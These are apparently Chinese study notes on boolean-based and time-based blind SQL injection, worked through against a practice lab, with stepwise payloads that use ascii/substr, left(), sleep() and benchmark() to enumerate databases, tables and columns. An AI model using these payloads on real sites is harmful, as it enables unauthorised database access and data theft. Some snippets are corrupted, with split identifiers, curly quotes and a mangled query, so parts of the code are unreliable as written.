# 2019.07.13记录

[TOC]

## 布尔盲注
	基于布尔的盲注（Boolean-based blind SQL injection），即可以根据返回页面判断条件真假的注入。比如对参数加一个’ and ‘1’=‘1和’ and ‘1’='2，如果第一个能查询出来，第二个不行，则说明可以注入，后面可以根据字段and exist(…)不断猜测。
### 一般步骤：
	1. 求闭合字符
	2. 求当前数据库名的长度
	3. 求当前数据库名对应的ascii值
	4. 求表的数量
	5. 求表名的长度
	6. 求表名对应的ascii值
	7. 求列的数量
	8. 求列的长度
	9. 求列名对应的ascii值
	10. 求字段的数量
	11. 求字段内容的长度
	12. 求字段内容对应的ascii值

```
布尔盲注常用语句：
substr(string,num start,num length)
string 为字符串
string 为字符串
length 为长度

ascii( )函数
作用：返回字符串str的字符ASCII码值。如果str是空字符串，返回0.如果string是 NULL,返回NULL。

布尔盲注过程代码模板：
(select count(schema_name) from information_schema.sc hemata)> n
n为数据库个数，当数据库个数大于n页面显示正常

(select length(schema_name) from information_schema.s chemata limit 0,1)> n
该语句判断数据库内第一个数据库名有多少字符，大于n则页面显示正常

(select ascii(substr((select schema_name from informa tion_schema.schemata limit 0,1),1,1)))>105
ascii（）将返回字符串的ascii值  
第一个1，表示截取字符串的起始位置
第二个1，表示截取字符串长度
该语句作用：判断第一个库第一个字符是什么
```

### 后台sql语句
sql="SELECT∗FROMusersWHEREid=′id’ LIMIT 0,1";

1. 判断数据库长度
```
?id=1’ and length(database())=8–+
返回正常，证明库的长度位八个字节 --+把后面的 ’ 注释掉
````

2. 判断数据库中的第一个字符
```
/?id=1’ and left(database(),1)<‘t’’ 用 ’ 与后面的单引号闭合
Left() 判断库的第一位是否小于t，返回正常说明首字母小于t
/?id=1’ and left(database(),1)>‘r’–+
返回正常，首字符位s，依次判断
?id=1’ and ascii(substr((select database()),2,1))>100 --+
?id=1’ and ascii(substr((select database()),2,1))<102 --+
判断库的第二位是什么（使用ascii判断） 证明是e
库名为security
```

3. 爆security中的表名
```
ascii(substr((select table_name from information_schema.tables
where table_schema=‘security’ limit 0,1),2,1))<109
?id=1’ and exists(select group_concat(table_name) from information_schema.tables where table_schema=‘security’ )–+
ascii(substr((select table_name from information_schema.tables
where table_schema=‘security’ limit 0,1),2,1))<109
依次类推，得到所有的表为emails，referers，uagents，users
````

4. 爆字段名
```
?id=1 and ascii(substr((select column_name from information_schema.columns where table_name=‘users’ and table_schema=‘security’ limit 0,1),1,1))<106%23
依次类推，得到users的表username的值为Dumb。
````

## 时间盲注

### 1. 利用sleep()函数进行延时注入：
' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+

【这里跟前面基于布尔的盲注类似，都是正确的话页面正常，但错误将会异常，这里错误会导致页面等待5秒，已经数据库security第一位为s，所以=115时正常显示，如图】

### 2. 利用benchmark()函数进行延时注入：
' union select (if(substring(current,1,1)=char(115),benchmark(50000000,encode('msg','by 5 second')),null)),2,3 from (select database() as current) as tb1--+

【与sleep函数处理相反，只有当猜对值时才会有延时，这里因为第一位是s猜对了，所以benchmark函数会将encode('msg','by 5 second')执行50000000次。这里substring和substr一样，都是截取字符，里面current可以改，只要和第一个as后面的current一起换，tb1也随便换啥都行，benchmark第一个参数是执行次数，后面几个都无所谓（至少有一个参数就行）】
